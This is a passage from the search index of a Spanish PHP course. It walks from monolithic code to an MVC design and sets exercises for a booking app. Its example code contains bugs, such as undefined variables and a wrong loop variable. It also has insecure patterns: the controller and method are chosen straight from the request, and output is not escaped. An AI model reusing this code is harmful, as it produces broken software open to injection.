Aplicaciones más robustas gracias al encapsulamiento. ¿Te suena? ¡Programación orientada a objetos! Cada capa se implementa en una clase, y cada clase hace su trabajo sin importunar a las demás y sin preocuparse por cómo funcionan las otras internamente. | El matenimiento es más sencillo. | Más flexibilidad para añadir módulos. | Más seguridad, al poder aislar (relativamente) cada capa del resto. | Mejor escalabilidad: es más fácil hacer crecer al sistema. | Mejor rendimiento (aunque esto podría discutirse: puedes hacer un sistema multicapa con un rendimiento desastroso y un sistema monolítico que vaya como un tiro. Pero, en general, es más fácil mejorar el rendimiento trabajando en cada capa por separado). | Es más fácil hacer el control de calidad, incluyendo la fase de pruebas. | . El único inconveniente reseñable de las arquitecturas multicapa es que pueden hacer que una aplicación muy simple se vuelva artificialmente más compleja de lo necesario. Pero eso solo sucede en aplicaciones muy, pero que muy simples. Para cualquier aplicación convencional, la arquitectura multicapa simplifica el diseño en lugar de complicarlo. En resumen: todo son ventajas. Ya ves por qué todo el mundo hace aplicaciones web con arquitecturas multicapa. ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#42-arquitectura-de-una-aplicaci%C3%B3n-web",
    "relUrl": "/mvc/#42-arquitectura-de-una-aplicación-web"
  },"39": {
    "doc": "4 Arquitectura MVC",
    "title": "4.3. La arquitectura Modelo-Vista-Controlador (MVC)",
    "content": "Y por fin llegamos a la palabreja: la arquitectura Modelo-Vista-Controlador o MVC. Cuando hablamos de arquitectura de una aplicación nos referimos a la estructura básica que la sustenta, como los pilares de un edificio en construcción. Si quitas las paredes, las ventanas, las puertas, los azulejos de la cocina… todavía pueden distinguirse las formas fundamentales, ¿verdad? . Pues bien, el patrón de arquitectura más popular en aplicaciones web se llama MVC o Modelo-Vista-Controlador y muy pronto se va a convertir para ti en un viejo amigo. 4.3.1. ¿Qué es el MVC? . El MVC es tan solo una arquitectura multicapa estandarizada. Una arquitectura de 3 capas, para ser exactos. Este es el esquema de una arquitectura en 3 capas. Recuerda lo que hemos visto antes: cada capa ejecuta una parte de la solución, y entre ellas colaboran para formar la aplicación completa. La capa superior interactúa con el usuario; la capa inferior, con la máquina (donde dice “hardware”, debería decir “cualquier cosa menos abstracta que nuestro programa”). Tienes permiso para imaginar cada capa como una clase con sus métodos y atributos. Pues bien, si a esas tres capas les ponemos nombres exóticos como modelo, vista y controlador, y tuneamos un poco el esquema, ya lo tenemos: la arquitectura MVC. Es decir, la arquitectura MVC solo es un caso particular de la arquitectura en 3 capas. ¿Y ya está? Bueno, no. Ahora tienes que aprender qué significa en realidad esta palabrería. Porque todo esto está muy bien como construcción teórica, pero ¿cómo te afecta a ti a la hora de programar? ¿Qué clases tienes que crear? ¿Qué parte del código hay que poner en cada clase? . En la práctica, es más simple de lo que parece. Lo vas a ver enseguida. Y lo maravilloso es que el 99,99% de las aplicaciones web encajan como un guante en esta arquitectura. Es decir, apenas tendremos que hacer trabajo de diseño previo, porque, si es una aplicación web, ya sabemos qué clases tendremos que construir: los que nos indique la arquitectura MVC. Antes de pasar a la parte práctica de todo esto, permíteme un breve apunte: por supuesto, nada impide construir arquitecturas con más de 3 capas. De hecho, nosotros vamos a usar una variante del MVC en el que se añade una capa adicional por debajo del modelo, es decir, una arquitectura con 4 capas. Pero ya llegaremos a eso. 4.3.2. MVC en la práctica: una implementación incremental . Tras esta introducción al MVC, vamos a estudiar a fondo este patrón. Y lo vamos a hacer por medio de un ejemplo, que es como mejor suelen comprenderse estas cosas. Una vez terminado y comprendido el ejemplo, daremos una definición más teórica. Es decir, que lo vamos hacer al revés de lo habitual: primero la práctica y luego la teoría. Según mi experiencia, la gente suele comprenderlo mejor en ese orden. Pero, para que esto funcione, tienes que leer el código fuente con atención. Es un código sencillo y bien comentado, y que se va complicando muy poco a poco, en pasos incrementales, desde un código clásico monolítico hasta una implementación completa de un MVC. Si lo lees con la atención que te pido, verás como, al acabar, entenderás perfectamente en qué consiste el MVC y podrás empezar a aplicarlo en tus proyectos. El ejemplo con el que vamos a trabajar es este: supongamos que queremos programar una pequeña aplicación web que nos permita hacer publicaciones en una especie de blog simplificado. Esas publicaciones se guardan como registros en una tabla de una base de datos. En el código de ejemplo sobre el que vamos a trabajar, nos vamos a centrar en una funcionalidad concreta de este mini-blog: el listado de los artículos existentes en la base de datos. Código monolítico . Una primera aproximación a la solución, sin usar ningún patrón de arquitectura en absoluto, podría ser esta (échale un vistazo y asegúrate de entenderlo): . &lt;? // Conectamos con la base de datos $db = new mysqli('mi-host', 'mi-usuario', 'mi-clave', 'mi-base-de-datos'); // Lanzamos una consulta para recuperar los artículos que haya en la base de datos $res = $db-&gt;query('SELECT fecha, titulo FROM articulo'); ?&gt; // Generamos una tabla HTML con el resultado de la consulta &lt;h1&gt;Listado de Artículos&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Fecha&lt;/th&gt; &lt;th&gt;Titulo&lt;/th&gt; &lt;/tr&gt; &lt;?php // Recorremos fila a fila el resultado de la consulta while ($row = $res-&gt;fetch_array()) { echo \"&lt;tr&gt;\"; echo \"&lt;td&gt; \".$row['fecha'].\" &lt;/td&gt;\"; echo \"&lt;td&gt; \".$row['titulo'].\" &lt;/td&gt;\"; echo \"&lt;/tr&gt;\"; } echo \"&lt;/table&gt;\"; // Cerramos la conexión con la BD $db-&gt;close(); ?&gt; . Esta solución se denomina monolítica, porque incluye todo el código necesario en el mismo bloque. Por supuesto, para un ejemplo tan simple como este, el código monolítico es más que suficiente, pero en un sistema más complejo pronto empieza a convertirse en un monstruo inmanejable. Primera mejora: controlador + vista . Vamos a aproximarnos un poco a la solución MVC separando ese código monolítico en dos bloques (que guardaremos en archivos distintos): . | Un controlador (archivo index.php). | Una vista (archivo showAllArticles.php). | . Primero, el controlador. Se encargará de recuperar los datos, pero no de mostrarlos. Generar el interfaz de usuario, es decir, el HTML, será la labor que le dejaremos a la vista. El controlador preparará esos datos y los empaquetará en un array para que estén disponibles en la vista. Y la vista la insertaremos en el controlador con un include(). &lt;? // Este es el controlador. // Como esta aplicación de ejemplo solo realiza una acción, // no usamos de momento la variable \"action\" // Conectamos a la BD y sacamos la lista de artículos $db = new mysqli('mi-host', 'mi-usuario', 'mi-clave', 'mi-base-de-datos'); $res = $db-&gt;query('SELECT fecha, titulo FROM articulo'); // Convertimos la lista de artículos, que es un cursor de MySQL, en un array estándar de PHP $articles = array(); while ($row = $res-&gt;fetch_array()) { $articles[] = $row; } $db-&gt;close(); // Incluimos el código de la vista, donde se usará el array de artículos // para generar la tabla HTML. include('showAllArticles.php'); ?&gt; . La vista que mostrará los datos del array contiene un código muy semejante al de la solución monolítica, solo que ahora estará ubicada en un archivo aparte (showAllArticles.php) y hará un bucle sobre el array de resultados que le ha preparado el controlador: . &lt;h1&gt;Listado de Articulos&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Fecha&lt;/th&gt; &lt;th&gt;Titulo&lt;/th&gt; &lt;/tr&gt; &lt;?php foreach($articles as $article) { echo \"&lt;tr&gt; &lt;td&gt;\".$article['fecha'].\"&lt;/td&gt; &lt;td&gt;\".$article['titulo'].\"&lt;/td&gt; &lt;/tr&gt;\"; } ?&gt; &lt;/table&gt; . Segunda mejora: modelo, vista y controlador . En esta segunda mejora, dividiremos el código en tres bloques (ubicados, de nuevo, en archivos diferentes): . | Un modelo para los artíclos (archivo articles.php). Contendrá una clase con un método que se encargará de acceder a la base de datos y empaquetar el resultado de la consulta en un array. | Una vista (archivo showAllArticles.php). Se encargará de generar el HTML con el resultado de la consulta. | Un controlador (archivo index.php). Se encargará de invocar al modelo y a la vista en el orden correcto. | . Por lo tanto, el controlador (index.php), al extraer de él todo lo que tenga que ver con la base de datos, se queda en algo tan sencillo como esto: . include('articles.php'); // En este archivo estará el modelo $articulos = Model::getAll(); // Este método del modelo nos devuelve la lista de artículos include('showAllArticles.php'); // En este archivo estará la vista . El modelo (articles.php) consta de una clase con solo un método (de momento) encargado de consultar todos los artículos y devolverlos empaquetados en un array: . &lt;?php class Articles { public function getAll() { $db = new mysqli('mi-host', 'mi-usuario', 'mi-clave', 'mi-base-de-datos'); $res=$db-&gt;query('SELECT fecha, titulo FROM articulo'); $articles = array(); while ($row = $res-&gt;fetch_array()) { $articles[] = $row; } $db-&gt;close(); return $articles; } } ?&gt; . Por último, la vista (showAllArticles.php) será exactamente igual que en la versión anterior: un recorrido por el array de artículos para mostrarlos en formato HTML: . &lt;h1&gt;Listado de Articulos&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Fecha&lt;/th&gt; &lt;th&gt;Titulo&lt;/th&gt; &lt;/tr&gt; &lt;?php foreach($articles as $article) { echo \"&lt;tr&gt; &lt;td&gt;\".$article['fecha'].\"&lt;/td&gt; &lt;td&gt;\".$article['titulo'].\"&lt;/td&gt; &lt;/tr&gt;\"; } ?&gt; &lt;/table&gt; . Tercera mejora: añadiendo capa de abstracción de datos . Como no sabemos lo que es el miedo, vamos a complicar nuestro patrón modelo-vista-controlador con una cuarta capa: la capa de abstracción de datos. La idea de esta capa adicional es proporcionar un mecanismo de abstracción respecto del gestor de base de datos concreto que estemos utilizando. Vaya frasecita, ¿eh? “Un mecanismo de abstracción respecto del gestor de base de datos”. Si no has bizqueado un poco al leerlo, es que tienes los nervios de acero. ¿Qué narices significa eso? . Es solo una de esas expresiones de que los informáticos usamos para fardar, como cuando un médico te dice que estás acatarrado, pero te lo dice en latín para que parezca más complicado de lo que es. Te explico qué es eso del “mecanismo de abstracción bla, bla, bla”. Si te fijas en el modelo de la solución anterior, verás que estamos usando una clase (mysqli) y unos métodos que solo funcionan con MySQL o MariaDB. Si quiséramos cambiar el gestor de base de datos (algo relativamente frecuente), tendríamos que revisar todos nuestros modelos, y tal vez modificar y volver a probar miles de líneas de código. Una forma de independizar nuestra aplicación del gestor de base de datos que haya debajo es programar lo que se llama capa de abstracción que contenga dos o tres métodos genéricos (como consultar() para lanzar SELECT o manipular() para lanzar INSERT, UPDATE o DELETE). De ese modo, cuando queramos hacer una consulta desde el modelo, no lo haremos con los métodos de MySQL (como query(), fetch_array() y similares), sino con los nuestros (consultar(), manipular(), o como los hayamos querido llamar). Si algún día necesitamos cambiar el gestor de base de datos, solo tendremos que reescribir el código de esa capa de abstracción, es decir, un par de decenas de líneas de código frente a varios miles que teníamos que revisar y probar antes. Por lo tanto, en esta tercera mejora vamos a dividir el código en cuatro bloques: . | Un controlador (archivo index.php). | Una vista (archivo view.php). | Un modelo en dos capas: . | Capa de abstracción de datos (db.php) | Capa de acceso a datos (el modelo de artículos propiamente dicho) (articles.php). | . | . El código de la capa de abstracción sería algo así: . class Db { private $db; // Aquí guardaremos la conexión con la base de datos /** * Abre la conexión con la base de datos * @param $server URL del servidor de la base de datos * @param $username Nombre de usuario en ese servidor * @param $pass Contraseña * @param $dbname Nombre de la base de datos * @return 0 si la conexión se realiza con normalidad y -1 en caso de error */ function createConnection($server, $username, $pass, $dbname) { $db = new mysqli($servidor, $usuario, $clave, $dbname); if ($db-&gt;connect_errno) return -1; else return 0; } /** * Cierra la conexión con la base de datos */ function closeConnection() { if ($this-&gt;db) $this-&gt;db-&gt;close(); } /** * Lanza una consulta (SELECT) contra la base de datos. * ¡Ojo! Este método solo funcionará con sentencias SELECT. * @param $sql El código de la consulta que se quiere lanzar * @return Un array bidimensional con los resultados de la consulta (estará vacío si la consulta no devolvió nada) */ function dataQuery($sql) { $res = $this-&gt;db-&gt;query($sql); $resArray = array(); if ($res) { $resArray = $res-&gt;fetch_all(); } return $resArray; } /** * Lanza una sentencia de manipulación de datos contra la base de datos. * ¡Ojo! Este método solo funcionará con sentencias INSERT, UPDATE, DELETE y similares. * @param $sql El código de la consulta que se quiere lanzar * @return El número de filas insertadas, modificadas o borradas por la sentencia SQL (0 si no produjo ningún efecto). */ function dataManipulation($sql) { $this-&gt;db-&gt;query($sql); return $this-&gt;db-&gt;affected_rows; } } . El código del modelo va a hacer uso de la capa de abstracción en lugar de usar los métodos de la clase mysqli directamente: . include \"Db.php\"; class Articles { public function getAll() { $db = new Db(); // Creamos un objeto para usar nuestra capa de abstracción // Conectamos con la BD a través de nuestra capa de abstracción $db-&gt;createConnection('mi-host', 'mi-usuario', 'mi-clave', 'mi-base-de-datos'); // Lanzamos la consulta a través de nuestra capa de abstracción. // Nos devolverá directamente un array estándar de PHP. $articles = $db-&gt;dataQuery('SELECT fecha, titulo FROM articulo'); // Cerramos la conexión con la BD $db-&gt;closeConnection(); return $articles; } } . El controlador y la vista son exactamente los mismos que en la solución anterior, así que no vamos a escribir el código de nuevo. Esto es lógico: solo hemos modificado la forma en la que trabaja el modelo, pero gracias al encapsulamiento de los objetos, el resto de la aplicación no se ha enterado de ello. Cuarta (y última) mejora: transformación en clases y objetos reutilizables. Código fuente definitivo . Para terminar, vamos a dejar el código bien organizado y a mostrarlo completo. Lo que haremos en esta última etapa es empaquetarlo todo en clases reutilizables. Observa que sigue siendo el mismo código fuente, solo que empaquetado en clases y métodos. Lo único que queda fuera de una clase es la instanciación inicial del objeto controlador. Fíjate bien en cómo hemos convertido las vistas en una clase con un método show() que nos servirá para mostrar cualquier vista y reutilizar el mismo header y el mismo footer. Cada vista se programará en un archivo independiente que deberemos organizar en directorios y subdirectorios. De momento, nuestra aplicación solo tiene una vista llamada showAllArticles, pero se podrían visualizar todas las necesarias usando el método show(). Otra cosa que quiero que observes con mucha atención es el punto de entrada a la aplicación (archivo index.php), porque lo hemos dejado preparado para poder añadir nuevas funciones al programa con posterioridad, así como varios controladores. El método que se ejecutará dependerá no solo de la variable “action” que se pasa por GET, sino también de otra variable llamada “controller”, que también se pasa por GET, y que contendrá el nombre de la clase del controlador. Así, para invocar, por ejemplo, el método showAll() del controlador ArticlesController, la ruta debería ser esta: . http://mi-servidor/index.php?controller=ArticlesController&amp;action=showAll . Este index.php es tan genérico que te servirá para montar cualquier aplicación MVC en el futuro. Si repasas el código del ejemplo resuelto de tema anterior (el de la autenticación mediante ACL), verás que ya se parecía mucho a este esquema, aunque en aquel index.php siempre utilizábamos el mismo controlador. Punto de entrada a la aplicación (index.php) . &lt;?php include(\"articlesController.php\"); // Miramos a ver si se indica alguna acción en la URL if (!isset($_REQUEST['action'])) { // No hay acción en la URL. Usamos la acción por defecto (main). Puedes cambiarla por cualquier otra que vaya bien con tu aplicación. $action = \"main\"; } else { // Sí hay acción en la URL. Recuperamos su nombre. $action = $_REQUEST['action']; } // Hacemos lo mismo con el nombre del controlador if (!isset($_REQUEST['controller'])) { // No hay controlador en la URL. Asignaremos un controlador por defecto (Articles). Por supuesto, puedes cambiarlo por otro que vaya bien con tu aplicación. $controllerClassName = \"ArticlesController\"; } else { // Sí hay controlador en la URL. Recuperamos su nombre. $controllerClassName = $_REQUEST['controller']; } // Instanciamos el controlador e invocamos al método que se llama como la acción $controller = new $controllerClassName(); $controller-&gt;$action(); ?&gt; . Controlador de artículos (articlesController.php) . // Controlador. Debería tener un método por cada posible valor de la variable \"action\". include (\"view.php\"); include (\"articles.php\"); class ArticlesController { public function showAll() { $data['articles'] = Articles::getAll(); View::show(\"showAllArticles\", $data); } // Añadir a partir de aquí un método por cada posible valor de la variable \"action\" } . Clase vista (view.php) . &lt;?php class View { public function show($viewName, $data=null) { include(\"header.php\"); include(\"$viewName.php\", $data); include(\"footer.php\"); } } ?&gt; . Vista showAllArticles (showAllArticles.php) . &lt;h1&gt;Listado de Articulos&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Fecha&lt;/th&gt; &lt;th&gt;Titulo&lt;/th&gt; &lt;/tr&gt; &lt;?php $articles = $data['articles']; foreach($articles as $article) { echo \"&lt;tr&gt; &lt;td&gt;\".$articles['fecha'].\"&lt;/td&gt; &lt;td&gt;\".$articles['titulo'].\"&lt;/td&gt; &lt;/tr&gt;\"; } ?&gt; &lt;/table&gt; . Modelo - Capa de acceso a datos (articles.php) . include \"db.php\"; class Articles { public function getAll() { $db = new Db(); $db-&gt;createConnection('mi-host', 'mi-usuario', 'mi-clave', 'mi-base-de-datos'); $articles = $db-&gt;dataQuery('SELECT fecha, titulo FROM articulo'); $db-&gt;closeConnection(); return $articles; } } . Modelo - Capa de abstracción de datos (db.php) . class Db { private $db; // Aquí guardaremos la conexión con la base de datos /** * Abre la conexión con la base de datos * @param $server URL del servidor de la base de datos * @param $username Nombre de usuario en ese servidor * @param $pass Contraseña * @param $dbname Nombre de la base de datos * @return 0 si la conexión se realiza con normalidad y -1 en caso de error */ function createConnection($server, $username, $pass, $dbname) { $db = new mysqli($servidor, $usuario, $clave, $dbname); if ($db-&gt;connect_errno) return -1; else return 0; } /** * Cierra la conexión con la base de datos */ function closeConnection() { if ($this-&gt;db) $this-&gt;db-&gt;close(); } /** * Lanza una consulta (SELECT) contra la base de datos. * ¡Ojo! Este método solo funcionará con sentencias SELECT. * @param $sql El código de la consulta que se quiere lanzar * @return Un array bidimensional con los resultados de la consulta (estará vacío si la consulta no devolvió nada) */ function dataQuery($sql) { $res = $this-&gt;db-&gt;query($sql); $resArray = array(); if ($res) { $resArray = $res-&gt;fetch_all(); } return $resArray; } /** * Lanza una sentencia de manipulación de datos contra la base de datos. * ¡Ojo! Este método solo funcionará con sentencias INSERT, UPDATE, DELETE y similares. * @param $sql El código de la consulta que se quiere lanzar * @return El número de filas insertadas, modificadas o borradas por la sentencia SQL (0 si no produjo ningún efecto). */ function dataManipulation($sql) { $this-&gt;db-&gt;query($sql); return $this-&gt;db-&gt;affected_rows; } } . ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#43-la-arquitectura-modelo-vista-controlador-mvc",
    "relUrl": "/mvc/#43-la-arquitectura-modelo-vista-controlador-mvc"
  },"40": {
    "doc": "4 Arquitectura MVC",
    "title": "4.4. El patrón MVC en la teoría",
    "content": "Ahora que hemos aprendido a manejarnos con el patrón MVC por medio de un ejemplo, estamos en condiciones de definirlo de manera más teórica. E incluso entender esa definición, no te vayas a creer. El patrón MVC consiste, pues, en dividir la aplicación en tres capas: . | Los modelos, donde se programa la lógica de negocio. De esa forma tan rimbombante se refiere la literatura técnica al acceso a los datos con los filtros, algoritmos y restricciones que el sistema imponga. Dicho en palabras más sencillas, esto significa que en los modelos debemos colocar todo el código de acceso a la base de datos o a cualquier otro recurso del servidor (como las variables de sesión, por ejemplo). Los modelos deben empaquetar esos datos en objetos estándar de PHP (como arrays) y devolverlos al controlador. Lo más práctico es crear un modelo para cada tabla maestra de la base de datos. Los frameworks automatizan los métodos más típicos de cada modelo, como insertar un registro, borrar, actualizar, consultar uno o consultar todos. Ya veremos de qué formas tan alucinantes se las ingenian para hacer todo esto con un mínimo de esfuerzo por nuestra parte y, por supuesto, sin escribir el mismo código una y otra vez. | Las vistas, donde se programan todas las salidas HTML que el usuario final va a ver y con las que va a interactuar. El código Javascript y CSS, por lo tanto, forma parte de las vistas. En las vistas estará el grueso del código de cualquier aplicación. Los frameworks más avanzados incluyen sistemas de plantillas para reutilizar fragmentos de vistas, así como lenguajes adicionales para simplificar la codificación de las vistas. Pero, si programamos en PHP clásico, tendremos que construir las vistas manualmente. | Los controladores, donde se captura cada petición del usuario y se dirige el flujo de ejecución, invocando a los modelos y a las vistas en el orden adecuado. En una aplicación pequeña, bastará con tener un controlador para todo. Cuando la aplicación crece, suele hacerse un controlador por cada modelo, es decir, un controlador por cada tabla maestra. Los controladores estarán compuestos por una colección de métodos, uno para cada funcionalidad de la aplicación. El método que se ejecute en cada ocasión estará controlado por la URL. En concreto, por la variable “action” que se pasará por GET, aunque, por supuesto, puedes ponerle otro nombre si “action” no te gusta. En los frameworks, esta variable “action” se transforma en una URL limpia que, a través de un objeto adicional llamado enrutador, termina provocando la invocación del método adecuado. Es decir: en una aplicación MVC como las que hemos visto hasta ahora, tendremos una ruta como esta para, por ejemplo, consultar el artículo con id 37: . https://mi-servidor/index.php?action=showArticle&amp;idArticle=37 . En cambio, en un framework avanzado, la ruta tendrá un aspecto más limpio para hacer lo mismo. Algo así como: . https://mi-servidor/articles/show/37 . Y el enrutador se encargará trocear esa URL y extraer de ella la información para instanciar el controlador adecuado y llamar al método correcto. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#44-el-patr%C3%B3n-mvc-en-la-teor%C3%ADa",
    "relUrl": "/mvc/#44-el-patrón-mvc-en-la-teoría"
  },"41": {
    "doc": "4 Arquitectura MVC",
    "title": "4.5. Ejercicios propuestos",
    "content": "Para terminar, como siempre, vamos a proponer algunos casos prácticos para que pongas manos a la obra. Se trata de crear, paso a paso, una aplicación web de corte realista que puede ser muy útil en un lugar como un instituto, una empresa, una oficina o cualquier otra organización medianamente compleja. Un problema que se presenta a menudo en estas organizaciones es la necesidad de compartir ciertos recursos, como proyectores, ordenadores portátiles, salas de conferencias o de exposiciones, etc. En nuestro instituto, por ejemplo, tenemos unas hojas impresas colgadas con una chincheta en un tablón de anuncios para que el profesorado reserve los carritos con portátiles o las aulas de informática, de modo que dos personas no traten de usar a la vez el mismo recurso. Es un método un poco primitivo (aunque eficaz, todo hay que decirlo) que se puede informatizar fácilmente mediante una aplicación web. Y eso es lo que proponemos aquí. Se trata de escribir una aplicación para reservar recursos de una organización. Los recursos pueden ser de cualquier tipo (ordenadores, proyectores, espacios físicos, etc.). Los usuarios, que tendrán que estar registrados, podrán reservar cada recurso durante tramos horarios predefinidos. Las tablas de la aplicación, por lo tanto, serán estas: . | Resources(id#, name, description, location, image) -&gt; Los recursos que se pueden reservar | Users(id#, username, password, realname) -&gt; Los usuarios registrados | TimeSlots(id#, dayOfWeek, startTime, endTime) -&gt; Los tramos temporales en lo que se pueden hacer reservas | Reservations(idResource#, idUser#, idTimeSlot#, date, remarks) -&gt; Las reservas (remarks = comentarios) | . La aplicación, una vez rellenadas con datos las tablas maestras Resources, Users y TimeSlots, permitirá a los usuarios registrados reservar recursos. Antes tendrán que autenticarse (es decir, pasar por un login). Para hacer una reserva, un usuario tiene que seleccionar un recurso, una fecha y un tramo horario. Si el recurso ya está reservado, no se podrá reservar por segunda vez, obviamente. Para conseguir implementar la aplicación completa, vamos a hacerlo por pasos, de modo incremental. ¡Que cada persona llegue hasta donde buenamente pueda! . Paso 1. Mantenimiento de la tabla Resources . En este paso, debes crear todos los elementos necesarios para hacer el manenimiento completo de la tabla de recursos. Es decir: listado, inserción, borrado y modificación de recursos. Hazlo exactamente en ese orden, porque he escrito las operaciones en orden de dificultad en su implementación. Para hacerlo, necesitarás: . | El punto de entrada a la aplicación (index.php) | El controlador de recursos (clase ResourcesController) | El modelo de recursos (clase Resources) | La capa de abstracción (clase Db) | La clase vista (View) | Una colección de vistas sencillas. Al menos dos: una para mostrar el listado de recursos y otra para el formulario de inserción y modificación (se puede reutilizar el mismo formulario para las dos cosas). | . Fíjate en que puedes reutilizar gran parte del código fuente que hemos mostrado como ejemplo de MVC más arriba, con unas pocas adaptaciones. Lo ideal es hacer que, desde la vista showAllResources, se pueda acceder al resto de funcionalidades relacionadas con los recursos. Es decir, esa vista quedaría algo así: . MANTENIMIENTO DE RECURSOS Recurso Ubicación Acciones Impresora Láser Brother Aula 8 Modificar | Eliminar Carrito de portátiles A Lab. Biología Modificar | Eliminar Proyector portátil Dirección Modificar | Eliminar etc. Añadir nuevo . Los textos “Modificar”, “Eliminar” y “Añadir nuevo” deben ser links que nos conduzcan de regreso a la aplicación para realizar esas acciones con los recursos. Paso 2. Mantenimiento de la tabla TimeSlots . El mantenimiento de esta tabla es muy similar al de la anterior. Necesitarás un controlador nuevo y un modelo nuevo, con métodos muy parecidos a los que ya has implementado para Resources. Paso 3. Mantenimiento de la tabla Users . Más de lo mismo. Reutiliza y adapta todo lo que puedas. Este tercer mantenimiento de tabla te debería salir con mucha más facilidad y rapidez que los dos anteriores. Paso 4. Menú principal . Hasta ahora, tenemos un puñado de métodos en uno o varios controladores que se invocan pasando variables de control por la URL (algo como http://mi-servidor/index.php?controller=resources&amp;action=showAll). En este punto, vamos a juntarlos todos en un menú principal que contendrá enlaces a todas esas URLs. Cuando añadamos más funcionalidades al programa, solo tendremos que agregarlas al menú principal. Es decir, se trata de construir una vista “mainMenu” (o con el nombre que más te guste) a la que se acceda después de superar el login y que muestre algo como esto: . Bienvenid@, nombre-de-usuario MENÚ DE OPCIONES Mantenimiento de recursos Mantenimiento de tramos horarios Mantenimiento de usuarios Cerrar sesión . Los textos “Mantenimiento de recursos”, “Mantenimiento de tramos horarios”, etc, deben ser links que nos conduzcan de regreso a la aplicación para acceder a las vistas de mantenimiento de esos elementos. Paso 5. Autenticación . De momento, cualquiera puede entrar a la aplicación y añadir, modificar o eliminar registros de las tablas maestras. Vamos a proteger el acceso al menú principal con un sistema de autenticación (login). Puedes reutilizar el código del tema anterior, cuando hablamos de las listas ACL, pero simplificando aquel código, puesto que aquí solo tenemos una tabla de usuarios registrados (nada de tablas de permisos ni roles). No te olvides de controlar el acceso a los métodos de los controladores para que solo los usuarios debidamente autenticados puedan ejecutarlos. Paso 6. Reservas . Hacer o eliminar reservas consiste, básicamente, en insertar y eliminar registros de la tabla TimeSlots. Sin embargo, no es un mantenimiento como el de las otras tablas, puesto que esta tabla proviene de una relación ternaria entre tres entidades (reservas, slots y usuarios), y no es una tabla maestra como tal. Por eso dejamos este mantenimiento de tabla para el final: porque es el más raro y, además, constituye la pieza principal de la aplicación: si esto no está hecho, la aplicación, simplemente, carece de su funcionalidad principal. Paso 7. Roles de usuario . (Este paso es optativo) . Vamos a añadir un campo nuevo a la tabla de usuarios. Lo llamaremos “type”, y solo podrá contener dos valores: 0 (admin) o 1 (user). Puedes usar un VARCHAR si te sientes más cómodo/a que con códigos numéricos. Si el usuario que entra en la aplicación es de tipo 0 (admin), tendrá acceso al menú principal y a todos los métodos de todos los controlares. Como hasta ahora, vamos. Pero si el usuario que entra en la aplicación es de tipo 1 (user), en el menú principal solo le aparecerán las opciones de acceso a las reservas. Es decir, no podrá añadir, modificar ni eliminar usuarios, slots o recursos. Cosa que es bastante lógica, ¿no te parece? . Recuerda revisar el acceso a todos los métodos de todos los controladores para asegurarte de que un usuario de tipo 1 no entre, por ejemplo, al método para borrar recursos, ni siquiera escribiendo manualmente la URL. Paso 8. Otras mejoras . (Este paso es optativo) . A la aplicación se le pueden hacer infinitas mejoras. Aquí te sugiero algunas, pero estaría bien que te sacaras otras de tu propia chistera: . | Hacer que las vistas sean visualmente atractivas con CSS y/o Javascript. | Mostrar un calendario en el que se aprecien visualmente las reservas de una semana o de un mes. O, mejor aún, incorporar un selector para poder ver el día actual, la semana actual o el mes actual (ojo, que esto último es bastante complicadillo). | Añadir la posibilidad de crear y anular reservas directamente desde el calendario. Observa que, así, la vista principal del usuario de tipo 1 sería el calendario, mientras que el usuario de tipo 0 seguiría accediendo al viejo menú de principal para hacer el mantenimiento completo de tablas. | Controlar que los usuarios de tipo 1 solo puedan eliminar sus propias reservas, no las de otros usuarios. En cambio, los usuarios de tipo 0 podrán eliminar cualquier reserva. | Eliminar automáticamente las reservas cuya fecha ya haya pasado. | . Paso 9. Enrutador . (Este paso es optativo) . Advertencia: ¡este paso puede resultar complicadillo! . ¿Te atreves a crear un enrutador como el de los frameworks avanzados? No es un elemento fundamental para que la aplicación web funcione, sino que tan solo sirve para construir rutas limpias. Recuerda que el enrutador tiene que ser capaz de coger una URL limpia, como esta: . https://mi-servidor/user/show/37 . …y deducir de ahí que hay que invocar el método show(37) del controlador de usuarios. O bien el método showUser(37) si tu aplicación es tan simple que solo tiene un controlador. Debería funcionar con cualquier ruta construida de ese modo y cualquier cantidad de controladores. A ver si se te ocurre algo para incorporar un enrutador como este a la aplicación. (No sé si te has dado cuenta, pero, poco a poco, estamos construyendo nuestro porpio framework casero para programar aplicaciones MVC) . ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#45-ejercicios-propuestos",
    "relUrl": "/mvc/#45-ejercicios-propuestos"
  },"42": {
    "doc": "4 Arquitectura MVC",
    "title": "4 Arquitectura MVC",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/",
    "relUrl": "/mvc/"
  },"43": {
    "doc": "5 Laravel",
    "title": "5. Laravel",
    "content": "Laravel es un framework PHP MVC diseñado para agilizar el desarrollo de aplicaciones web. En ese sentido, hace auténtica magia. En los últimos años ha tenido una gran penetración en la industria. Empezaremos por aprender qué es un framework PHP MVC, qué frameworks existen y en qué circunstancias resulta interesante utilizar una de estas herramientas para desarrollar una aplicación. Dedicaremos el resto del tema a estudiar todas las peculiaridades de Laravel para aprender a desarrollar aplicaciones con este poderoso framework. ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/#5-laravel",
    "relUrl": "/laravel/#5-laravel"
  },"44": {
    "doc": "5 Laravel",
    "title": "5 Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/",
    "relUrl": "/laravel/"
  },"45": {
    "doc": "6 Servicios web",
    "title": "6. Servicios web",
